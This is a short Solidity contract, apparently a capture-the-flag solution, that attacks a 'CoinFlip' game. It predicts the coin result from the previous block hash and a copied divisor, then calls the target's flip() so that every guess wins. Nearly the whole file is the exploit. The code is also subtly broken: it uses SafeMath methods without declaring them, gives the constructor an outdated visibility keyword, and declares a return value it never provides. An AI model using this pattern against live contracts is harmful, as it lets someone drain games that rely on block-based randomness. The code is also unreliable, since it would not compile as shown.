// SPDX-License-Identifier: MIT

// I have used the latest version of solidity with this contract
pragma solidity ^0.8.0;

// Import the original contract that is running 0.8.0 or above and using the correct import URL for SafeMath
import './CoinFlip.sol';

contract GuessCoinFlip {

  CoinFlip public TargetContract;
  // Same factor number that is located in the target contract (this must be exactly the same) 
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _targetContractAddress) public {
    TargetContract = CoinFlip(_targetContractAddress);
  }

  function flip() public returns (bool){
    // You can use the exact code from the target contract as this is also using SafeMath.
    uint256 GuessBlockValue = uint256(blockhash(block.number.sub(1)));
    uint256 flippedCoin = GuessBlockValue.div(FACTOR);
    bool side = flippedCoin == 1 ? true : false;

    TargetContract.flip(side);
  }
}
